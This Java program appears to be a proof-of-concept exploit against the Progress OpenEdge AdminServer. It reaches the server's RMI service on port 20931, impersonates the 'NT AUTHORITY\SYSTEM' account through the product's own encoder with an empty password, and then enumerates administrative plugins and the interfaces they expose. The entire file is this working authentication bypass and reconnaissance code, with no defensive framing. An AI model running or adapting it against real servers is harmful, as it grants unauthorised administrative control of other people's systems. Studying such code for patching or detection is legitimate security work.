import com.progress.auth.codec.CodecFactory;
import com.progress.auth.codec.Encoder;
import com.progress.chimera.adminserver.IAdminServer;
import com.progress.chimera.adminserver.IAdminServerConnection;
import java.rmi.Naming;
import java.lang.reflect.Proxy;
import java.util.Vector;


public class Main {
    public static void main(String[] args) throws Exception {
	Encoder encoder = CodecFactory.getCodec("oech1").getEncoder();
        String username = encoder.encode("NT AUTHORITY\\SYSTEM");
        IAdminServerConnection serverConnection = (IAdminServerConnection) Naming.lookup("rmi://" + args[0] + ":20931/Chimera");
        IAdminServer adminServer = serverConnection.connect(username, "");

        String[] plugins = {
                "com.progress.system.SystemPlugIn",
                "com.progress.agent.database.AgentPlugIn",
                "com.progress.ubroker.tools.NSRemoteObject",
                "com.progress.ubroker.tools.UBRemoteCommand",
                "com.progress.juniper.admin.JAPlugIn",
                "com.progress.agent.smdatabase.SMPlugIn",
        };

        for (String plugin_name : plugins) {
            Vector plugin = adminServer.getPlugins(plugin_name);
            System.out.println(plugin_name);
            for (int i = 0; i < plugin.size(); ++i) {
                Proxy proxy = (Proxy) plugin.get(i);
                Class<?>[] interfaces = proxy.getClass().getInterfaces();
                for (Class<?> iface : interfaces) {
                    System.out.println("\t" + iface.getName());
                }
                System.out.println();
            }
        }
    }
}
